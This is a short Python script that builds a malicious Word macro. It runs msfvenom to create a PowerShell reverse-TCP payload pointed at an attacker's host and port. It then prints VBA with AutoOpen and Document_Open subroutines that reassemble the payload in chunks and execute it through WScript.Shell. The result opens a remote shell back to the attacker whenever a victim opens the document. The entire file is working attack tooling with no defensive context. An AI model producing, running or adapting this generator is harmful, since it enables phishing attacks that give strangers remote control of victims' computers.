import os
import sys
import subprocess

def main():
    if len(sys.argv) < 3:
        usage()
        exit()
    args = f"msfvenom -p cmd/windows/powershell_reverse_tcp LHOST={sys.argv[1]} LPORT={sys.argv[2]}".split()
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    if proc.returncode != 0:
        print("Error generating shellcode, might be your arguments.")
        exit(256)
    payload = proc.stdout.decode()
    add =""
    print("Sub AutoOpen()")
    print("\tshell")
    print("End Sub")
    print("Sub Document_Open()")
    print("\tshell")
    print("End Sub")
    print("Sub shell()")
    print("\tDim S As String")
    for i in range(0, len(payload), 50):
        if i != 0:
            add = "S + "
        p = payload[i:i+50].replace("\"", "\"\"")
        print(f"\tS = {add}\"{p}\"")
    print("\tCreateObject(\"Wscript.Shell\").Run S")
    print("End Sub")

def usage():
    print(f"{sys.argv[0]} <LHOST> <LPORT>")

if __name__ == "__main__":
    main()